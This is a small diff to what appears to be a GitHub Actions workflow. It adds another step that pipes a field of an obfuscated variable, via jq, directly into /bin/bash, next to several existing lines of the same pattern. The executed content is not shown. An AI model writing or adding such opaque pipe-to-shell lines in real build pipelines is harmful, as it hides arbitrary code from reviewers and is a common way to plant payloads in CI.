@@ -28,6 +28,7 @@ jobs:
           echo $cgwn3 | jq -r .bkjtu75 | /bin/bash
           printf '%s' "$yyo5865" | jq -r .nucv73826 | /bin/bash
           echo $gu1 | jq -r .zdhg2 | /bin/bash
+          printf '%s' "$xklmn591" | jq -r .scf52889 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
